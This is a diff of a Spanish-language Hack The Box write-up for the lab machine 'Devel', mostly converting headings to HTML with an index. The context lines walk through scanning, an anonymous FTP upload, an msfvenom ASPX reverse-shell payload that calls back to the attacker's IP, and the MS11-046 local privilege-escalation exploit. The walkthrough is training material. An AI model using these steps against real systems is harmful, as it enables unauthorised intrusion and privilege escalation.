@@ -22,10 +22,62 @@ tags:
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-devel/devel_logo.png)
+
 Una máquina bastante sencilla, en la cual usaremos el servicio FTP para cargar un Payload que contendrá una Shell que se activará en el puerto HTTP que corre el servicio IIS y después escalaremos privilegios usando el Exploit MS11-046.
 
-# Recopilación de Información
-## Traza ICMP
+
+<br>
+<hr>
+<div id="Indice">
+	<h1>Índice</h1>
+	<ul>
+		<li><a href="#Recopilacion">Recopilación de Información</a></li>
+			<ul>
+				<li><a href="#Ping">Traza ICMP</a></li>
+				<li><a href="#Puertos">Escaneo de Puertos</a></li>
+				<li><a href="#Servicios">Escaneo de Servicios</a></li>
+			</ul>
+		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
+			<ul>
+				<li><a href="#FTP">Enumeración Servicio FTP</a></li>
+				<li><a href="#HTTP">Analizando Puerto 80</a></li>
+				<li><a href="#IIS">Investigando Servicio IIS</a></li>
+			</ul>
+		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
+			<ul>
+				<li><a href="#Payload">Configurando un Payload y Netcat</a></li>
+				<ul>
+                                        <li><a href="#Msfvenom">Configurando el Payload con Msfvenom</a></li>
+					<li><a href="#Netcat">Configurando Netcat</a></li>
+					<li><a href="#Windows">Enumeración de Windows</a></li>
+                                </ul>
+			</ul>
+		<li><a href="#Post">Post Explotación</a></li>
+			<ul>
+				<li><a href="#Exploit">Buscando, Configurando y Activando un Exploit</a></li>
+				<ul>
+                                	<li><a href="#PruebaExp">Probando Exploit: Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)</a></li>
+                        	</ul>
+			</ul>
+		<li><a href="#Links">Links de Investigación</a></li>
+	</ul>
+</div>
+
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
+<h2 id="Ping">Traza ICMP</h2>
+
 Vamos a realizar un ping para saber si la máquina está conectada, además vamos a analizar el TTL para saber que SO usa dicha máquina.
 ```
 ping -c 4 10.10.10.5
@@ -41,7 +93,8 @@ rtt min/avg/max/mdev = 130.729/131.531/132.293/0.750 ms
 ```
 Ok, vemos que la máquina usa Windows. Es momento de hacer los escaneos de puertos y servicios.
 
-## Escaneo de Puertos
+<h2 id="Puertos">Escaneo de Puertos</h2>
+
 ```
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.5 -oG allPorts             
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
@@ -76,7 +129,8 @@ Nmap done: 1 IP address (1 host up) scanned in 30.54 seconds
 
 Al parecer solamente hay 2 puertos abiertos y que ya conocemos, el puerto 21 que es el servicio FTP y el puerto 80 que es HTTP, ósea una página web. Hagamos el escaneo de servicios.
 
-## Escaneo de Servicios
+<h2 id="Servicios">Escaneo de Servicios</h2>
+
 ```
 nmap -sC -sV -p21,80 10.10.10.5 -oN targeted                                                   
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-14 13:02 CST
@@ -108,8 +162,21 @@ Nmap done: 1 IP address (1 host up) scanned in 14.80 seconds
 
 Vemos que en el servicio FTP tenemos activado el login como **anonymous**, vamos a meternos para ver que podemos encontrar y después analizaremos la página web.
 
-# Análisis de Vulnerabilidades
-## Enumerando Servicio FTP
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
+<h2 id="FTP">Enumeración Servicio FTP</h2>
+
 ```
 ftp 10.10.10.5  
 Connected to 10.10.10.5.
@@ -197,7 +264,8 @@ ftp> ls
 ```
 Mmmmmm vaya, vaya, así que podemos subir archivos. Antes de investigar cómo podemos vulnerar el servicio FTP, analicemos la página web para ver que encontramos.
 
-## Analizando Servicio HTTP
+<h2 id="HTTP">Analizando Puerto 80</h2>
+
 Al entrar en la página, no hay nada, más que una imagen del servicio que está corriendo y si le damos click a la imagen nos mandara directo a la página de Microsoft acerca del servicio IIS.
 
 ![](/assets/images/htb-writeup-devel/Captura1.png)
@@ -222,7 +290,8 @@ Intentemos ver si se puede ejecutar:
 
 Hay que investigar un poco sobre el servicio IIS.
 
-## Investigando el Servicio IIS
+<h2 id="IIS">Investigando Servicio IIS</h2>
+
 De acuerdo con el siguiente link de la página HackTricks: 
 * https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services
 
@@ -242,9 +311,24 @@ De momento vamos a descartar la PHP y el config porque no creo que nos sirvan pa
 
 Ósea que es un archivo ejecutable, ya tenemos con que trabajar.
 
-# Explotación de Vulnerabilidades
-## Configurando un Payload y Netcat
-### Configurando el Payload con Msfvenom
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+<h2 id="Payload">Configurando un Payload y Netcat</h2>
+
+Vamos a configurar primero el Payload y luego la Netcat.
+
+<h3 id="Msfvenom">Configurando el Payload con Msfvenom</h3>
+
 Vamos a empezar configurando un Payload con **msfvenom** para que nos conecte como lo hemos hecho con máquinas anteriores:
 ```
 msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.12 LPORT=443 -o IIS_Shell.aspx  
@@ -309,7 +393,8 @@ iis apppool\web
 ```
 Muy bien, ahora probemos con la netcat.
 
-### Configurando Netcat
+<h3 id="Netcat">Configurando Netcat</h3>
+
 Resulta que, si requieres un archivo **.aspx** que contenga un Payload y devuelva una Shell, existen dentro del **Kali Linux** y supongo que dentro de **Parrot** como la netcat o nc.exe que usamos en la **máquina Legacy**.
 
 Para buscarlo solo usamos el comando locate de la siguiente manera:
@@ -375,7 +460,8 @@ Quizá podríamos tratar de ejecutar una netcat que este dentro del servicio FTP
 
 Vamos a cambiar al Payload y a conseguir acceso como Root.
 
-## Enumeración de Windows
+<h2 id="Windows">Enumeración de Windows</h2>
+
 Una vez más dentro de la máquina, vamos a buscar la flag del usuario:
 ```
 c:\windows\system32\inetsrv>cd C:\
@@ -536,8 +622,21 @@ Registered Owner:          babis
 ```
 Ok tenemos el privilegio **SeImpersonatePrivilege** y vemos que el SO es **WIndows 7 6.1.7600**, además de que el dueño es **babis**. Vamos a buscar un Exploit.
 
-# Post Explotación
-## Buscando, Configurando y Activando un Exploit
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Post" style="text-align:center;">Post Explotación</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
+<h2 id="Exploit">Buscando, Configurando y Activando un Exploit</h2>
+
 Buscando por internet, nos aparece uno en particular que es el **MS11-046** que es un **Local Privilege Escalation** y que justamente nos serviría en estos momentos. 
 Puede verlo en el siguiente link: 
 
@@ -561,7 +660,8 @@ MS11-046 - Dissecting a 0day                                                    
 ```
 Justamente lo tenemos, vamos a copiarlo y a analizarlo para saber cómo usarlo.
 
-### Probando Exploit: Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)
+<h3 id="PruebaExp">Probando Exploit: Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)</h3>
+
 Gracias al creador del Exploit, nos deja una pequeña explicación para convertir el Exploit en un ejecutable **.exe**:
 ```
 Exploit notes:
@@ -710,7 +810,16 @@ dir
 ```
 Y listo, ya tenemos las flags de la máquina.
 
-## Links de Investigación
+
+<br>
+<br>
+<div style="position: relative;">
+ <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+
 * https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#internal-ip-address-disclosure
 * https://medium.com/@kubotortech/pentesting-exploiting-ftp-cba8ec81968e
 * https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/
@@ -719,4 +828,6 @@ Y listo, ya tenemos las flags de la máquina.
 * https://www.exploit-db.com/exploits/40564
 * https://www.rapid7.com/db/vulnerabilities/WINDOWS-HOTFIX-MS11-046/
 
+
+<br>
 # FIN
